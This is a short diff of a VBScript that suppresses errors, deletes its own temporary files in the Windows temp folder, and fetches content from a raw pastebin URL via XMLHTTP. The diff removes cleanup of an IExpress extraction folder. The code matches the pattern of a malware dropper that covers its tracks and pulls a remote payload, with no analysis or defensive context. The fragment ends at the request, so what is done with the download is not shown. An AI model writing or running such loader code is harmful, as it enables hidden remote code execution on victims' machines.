@@ -2,8 +2,6 @@ On Error Resume Next
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 tmpPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\.vbs"
 objFSO.DeleteFile tmpPath
-dirPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\IXP000.TMP"
-objFSO.DeleteFolder dirPath
 Set oHTTP = CreateObject("MSXML2.XMLHTTP")
 oHTTP.open "GET", "https://pastebin.com/raw/knWXwasC", False
 oHTTP.send
